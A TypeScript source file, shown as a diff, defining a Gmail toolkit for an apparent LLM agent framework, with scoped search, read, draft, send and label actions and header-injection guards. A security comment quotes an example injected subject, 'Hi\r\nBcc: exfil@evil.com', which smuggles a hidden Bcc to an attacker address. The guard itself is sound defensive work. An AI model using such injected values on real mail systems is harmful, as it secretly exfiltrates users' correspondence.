@@ -1,0 +1,221 @@
+/**
+ * The `gmail` toolkit (§14). The second toolkit on the same `google` provider —
+ * it proves the toolkit split, the shared connection, and incremental consent.
+ * Scopes are deliberately per-action (search → readonly, send → send, drafts →
+ * compose, labels → modify): a single toolkit scope would over-grant them all.
+ */
+import { z } from 'zod';
+import { defineToolkit, httpAction } from '../../core/authoring';
+import { GOOGLE_SCOPES } from './provider';
+
+const GMAIL = '/gmail/v1/users/me';
+
+const hasNonAscii = (s: string): boolean => /[^\x00-\x7F]/.test(s);
+const hasLineBreak = (s: string): boolean => /[\r\n]/.test(s);
+
+// Loose but practical address check — bare addresses only (no display names/angle brackets).
+const EMAIL_RE = /^[^\s@,<>]+@[^\s@,<>]+\.[^\s@,<>]+$/;
+const isEmailList = (s: string): boolean =>
+  s.split(',').map((p) => p.trim()).filter(Boolean).length > 0 &&
+  s.split(',').map((p) => p.trim()).filter(Boolean).every((p) => EMAIL_RE.test(p));
+
+/**
+ * Header-injection guards (security). `to`/`cc`/`bcc`/`subject` are LLM-controlled
+ * and interpolated into RFC 5322 header lines, so a CR/LF would inject a header or
+ * an alternate body (e.g. a `subject` of `"Hi\r\nBcc: exfil@evil.com"`). Recipients
+ * must be bare addresses; every header value must be single-line. Enforced in the
+ * Zod schema (→ `invalid_input`, before execute) AND defended again in `encodeEmail`.
+ */
+const recipientField = z
+  .string()
+  .refine((s) => !hasLineBreak(s), 'recipients must not contain line breaks')
+  .refine(isEmailList, 'must be a valid email address or comma-separated list of addresses');
+const subjectField = z.string().refine((s) => !hasLineBreak(s), 'subject must not contain line breaks');
+
+/** RFC 2047-encode a header value when it carries non-ASCII bytes (e.g. a unicode subject). */
+function encodeHeaderWord(value: string): string {
+  return hasNonAscii(value) ? `=?UTF-8?B?${Buffer.from(value, 'utf8').toString('base64')}?=` : value;
+}
+
+/** Build a minimal RFC 5322 message and base64url-encode it for the Gmail API. */
+export function encodeEmail(input: { to: string; subject: string; body: string; cc?: string; bcc?: string }): string {
+  // Defense in depth — schemas already reject these, but a header value must never break out.
+  for (const [name, value] of [
+    ['To', input.to],
+    ['Cc', input.cc],
+    ['Bcc', input.bcc],
+    ['Subject', input.subject],
+  ] as const) {
+    if (value && hasLineBreak(value)) throw new Error(`mail header "${name}" contains a line break`);
+  }
+  const headers = [
+    `To: ${input.to}`,
+    input.cc ? `Cc: ${input.cc}` : null,
+    input.bcc ? `Bcc: ${input.bcc}` : null,
+    `Subject: ${encodeHeaderWord(input.subject)}`,
+    'MIME-Version: 1.0',
+    'Content-Type: text/plain; charset="UTF-8"',
+    'Content-Transfer-Encoding: base64',
+  ].filter((h): h is string => h !== null);
+  // base64-encode the body so any UTF-8 bytes are carried safely (7bit was wrong for non-ASCII);
+  // wrap at 76 columns per RFC 2045.
+  const body = (Buffer.from(input.body, 'utf8').toString('base64').match(/.{1,76}/g) ?? []).join('\r\n');
+  const raw = `${headers.join('\r\n')}\r\n\r\n${body}`;
+  return Buffer.from(raw, 'utf8').toString('base64url');
+}
+
+interface GmailPayload {
+  mimeType?: string;
+  headers?: Array<{ name?: string; value?: string }>;
+  body?: { data?: string; size?: number };
+  parts?: GmailPayload[];
+}
+
+interface RawMessage {
+  id?: string;
+  threadId?: string;
+  snippet?: string;
+  labelIds?: string[];
+  payload?: GmailPayload;
+}
+
+const WANTED_HEADERS = ['From', 'To', 'Cc', 'Bcc', 'Subject', 'Date', 'Message-ID'];
+
+function extractHeaders(p?: GmailPayload): Record<string, string> | undefined {
+  const out: Record<string, string> = {};
+  for (const h of p?.headers ?? []) {
+    if (h.name && h.value !== undefined && WANTED_HEADERS.includes(h.name)) out[h.name] = h.value;
+  }
+  return Object.keys(out).length ? out : undefined;
+}
+
+function extractPlainText(p?: GmailPayload): string | undefined {
+  if (!p) return undefined;
+  if ((p.mimeType ?? '').startsWith('text/plain') && p.body?.data) {
+    try {
+      return Buffer.from(p.body.data, 'base64url').toString('utf8');
+    } catch {
+      return undefined;
+    }
+  }
+  for (const part of p.parts ?? []) {
+    const t = extractPlainText(part);
+    if (t) return t;
+  }
+  return undefined;
+}
+
+export const gmail = defineToolkit({
+  id: 'gmail',
+  providerId: 'google',
+  displayName: 'Gmail',
+  // `scopes` (the upfront-consent bundle) defaults to the union of the actions' scopes
+  // (§3). Declaring it by hand drifts — it previously omitted gmail.compose, so a
+  // full-toolkit connect could never create a draft (P2-b). Let `defineToolkit` derive it.
+  actions: [
+    httpAction({
+      id: 'gmail.search_messages',
+      description: 'Search messages with a Gmail query (e.g. "from:alice is:unread").',
+      scopes: [GOOGLE_SCOPES.gmailReadonly],
+      input: z.object({
+        query: z.string().describe('Gmail search query'),
+        maxResults: z.number().int().positive().max(100).default(20),
+      }),
+      request: (i) => ({ method: 'GET', path: `${GMAIL}/messages`, query: { q: i.query, maxResults: i.maxResults } }),
+      output: (raw) => {
+        const r = raw as { messages?: Array<{ id?: string; threadId?: string }>; resultSizeEstimate?: number };
+        return {
+          messages: (r.messages ?? []).map((m) => ({ id: m.id, threadId: m.threadId })),
+          estimate: r.resultSizeEstimate ?? 0,
+        };
+      },
+    }),
+
+    httpAction({
+      id: 'gmail.get_message',
+      description: 'Get a message by id (metadata + snippet).',
+      scopes: [GOOGLE_SCOPES.gmailReadonly],
+      input: z.object({
+        messageId: z.string(),
+        format: z.enum(['full', 'metadata', 'minimal']).default('metadata'),
+      }),
+      request: (i) => ({ method: 'GET', path: `${GMAIL}/messages/${encodeURIComponent(i.messageId)}`, query: { format: i.format } }),
+      // `format` is now honored: 'metadata'/'full' surface the parsed headers; 'full' also
+      // includes the decoded plain-text body. 'minimal' returns no payload, so neither appears.
+      output: (raw) => {
+        const m = raw as RawMessage;
+        const headers = extractHeaders(m.payload);
+        const text = extractPlainText(m.payload);
+        return {
+          id: m.id,
+          threadId: m.threadId,
+          snippet: m.snippet,
+          labelIds: m.labelIds ?? [],
+          ...(headers ? { headers } : {}),
+          ...(text ? { text } : {}),
+        };
+      },
+    }),
+
+    httpAction({
+      id: 'gmail.create_draft',
+      description: 'Create a draft email (does not send).',
+      mutating: true,
+      risk: 'medium',
+      scopes: [GOOGLE_SCOPES.gmailCompose],
+      input: z.object({
+        to: recipientField,
+        subject: subjectField,
+        body: z.string(),
+        cc: recipientField.optional(),
+      }),
+      request: (i) => ({ method: 'POST', path: `${GMAIL}/drafts`, body: { message: { raw: encodeEmail(i) } } }),
+      output: (raw) => {
+        const r = raw as { id?: string; message?: RawMessage };
+        return { draftId: r.id, messageId: r.message?.id };
+      },
+    }),
+
+    httpAction({
+      id: 'gmail.send_email',
+      description: 'Send an email from the connected account.',
+      mutating: true,
+      risk: 'high',
+      scopes: [GOOGLE_SCOPES.gmailSend],
+      input: z.object({
+        to: recipientField,
+        subject: subjectField,
+        body: z.string(),
+        cc: recipientField.optional(),
+        bcc: recipientField.optional(),
+      }),
+      request: (i) => ({ method: 'POST', path: `${GMAIL}/messages/send`, body: { raw: encodeEmail(i) } }),
+      output: (raw) => {
+        const m = raw as RawMessage;
+        return { id: m.id, threadId: m.threadId };
+      },
+    }),
+
+    httpAction({
+      id: 'gmail.modify_labels',
+      description: 'Add and/or remove labels on a message.',
+      mutating: true,
+      risk: 'medium',
+      scopes: [GOOGLE_SCOPES.gmailModify],
+      input: z.object({
+        messageId: z.string(),
+        addLabelIds: z.array(z.string()).default([]),
+        removeLabelIds: z.array(z.string()).default([]),
+      }),
+      request: (i) => ({
+        method: 'POST',
+        path: `${GMAIL}/messages/${encodeURIComponent(i.messageId)}/modify`,
+        body: { addLabelIds: i.addLabelIds, removeLabelIds: i.removeLabelIds },
+      }),
+      output: (raw) => {
+        const m = raw as RawMessage;
+        return { id: m.id, labelIds: m.labelIds ?? [] };
+      },
+    }),
+  ],
+});
